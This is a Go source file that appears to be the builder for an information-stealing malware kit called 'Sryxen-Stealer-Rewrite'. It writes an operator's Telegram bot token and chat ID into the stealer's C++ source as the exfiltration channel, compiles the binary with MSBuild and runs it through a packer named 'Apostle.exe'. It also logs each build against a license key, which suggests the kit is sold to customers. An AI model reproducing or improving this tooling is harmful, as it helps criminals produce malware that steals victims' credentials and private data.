package build

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"encoding/base64"
	"log"
)

const (
	sourceFilePath = "Source/Sryxen-Stealer-Rewrite/Sryxen.cpp"
	msbuildPath    = `C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe`
	projectFile    = "Source/Sryxen-Stealer-Rewrite.sln"
)

func EncryptString(input string, key byte) string {
	xored := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		xored[i] = input[i] ^ key
	}
	encoded := base64.StdEncoding.EncodeToString(xored)
	return encoded
}

func modifySourceFile(botToken, chatID string) (string, error) {
	content, err := ioutil.ReadFile(sourceFilePath)
	if err != nil {
		return "", fmt.Errorf("❌ Failed to read source file: %w", err)
	}

	originalContent := string(content)

	chatIDExists := strings.Contains(originalContent, `#define CHAT_ID OBF("%HAT%")`)
	botTokenExists := strings.Contains(originalContent, `#define BOT_TOKEN OBF("%BOT_TOKEN%")`)

	if !chatIDExists || !botTokenExists {
		fmt.Println("⚠️ Warning: One or both placeholders not found in Sryxen.cpp! Build may fail.")
	} else {
		fmt.Println("✅ Found placeholders, replacing values...")
	}

	newContent := strings.ReplaceAll(originalContent, `#define CHAT_ID OBF("%HAT%")`, fmt.Sprintf(`#define CHAT_ID OBF("%s")`, chatID))
	newContent = strings.ReplaceAll(newContent, `#define BOT_TOKEN OBF("%BOT_TOKEN%")`, fmt.Sprintf(`#define BOT_TOKEN OBF("%s")`, botToken))

	err = ioutil.WriteFile(sourceFilePath, []byte(newContent), 0644)
	if err != nil {
		return "", fmt.Errorf("❌ Failed to write modified source file: %w", err)
	}

	fmt.Println("🔄 Successfully replaced values in Sryxen.cpp.")

	return originalContent, nil
}

func restoreSourceFile(originalContent string) error {
	err := ioutil.WriteFile(sourceFilePath, []byte(originalContent), 0644)
	if err != nil {
		fmt.Println("❌ Failed to restore original Sryxen.cpp:", err)
		return err
	}

	fmt.Println("✅ Restored Sryxen.cpp to its original state.")
	return nil
}

func BuildBinary(botToken, chatID string, output, name string, debug bool) (string, error) {
	originalContent, err := modifySourceFile(botToken, chatID)
	if err != nil {
		return "", err
	}
	defer restoreSourceFile(originalContent) 

	outputPath, err := filepath.Abs(output)
	if err != nil {
		return "", err
	}

	fmt.Println("Output path:", outputPath)

	nameWithoutExe := strings.TrimSuffix(name, ".exe")

	fmt.Println("Generating binary:", nameWithoutExe)

	if _, err := exec.LookPath(msbuildPath); err != nil {
		return "", fmt.Errorf("❌ MSBuild.exe not found at %s", msbuildPath)
	}

	args := []string{
		projectFile,
		"/p:Configuration=Release",
		fmt.Sprintf("/p:TargetName=%s", nameWithoutExe),
		fmt.Sprintf("/p:OutDir=%s", outputPath),
	}

	cmd := exec.Command(msbuildPath, args...)
	cmdOutput, err := cmd.CombinedOutput()

	return string(cmdOutput), err
}

func PackBinary(input string) (string, error) {
	fmt.Printf("Packing file at %s!\n", input)
	if _, err := os.Stat(input); os.IsNotExist(err) {
		return "", fmt.Errorf("❌ Input file does not exist: %s", input)
	}

	cmd := exec.Command(".\\Apostle.exe", input)
	cmd.Dir = "Packer"

	cmdOutput, err := cmd.CombinedOutput()
	if err != nil {
		return string(cmdOutput), fmt.Errorf("❌ Failed to run Apostle.exe: %w", err)
	}

	fmt.Println(string(cmdOutput))

	return string(cmdOutput), nil
}

func LogBuild(license, botToken, chatID string) bool {
	file, err := os.OpenFile("Builds.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println("❌ Error opening log file:", err)
		return false
	}
	defer file.Close()

	logger := log.New(file, "", log.LstdFlags)
	logger.Printf("License: %s | Token: %s | ChatID: %s\n", license, botToken, chatID)

	return true
}
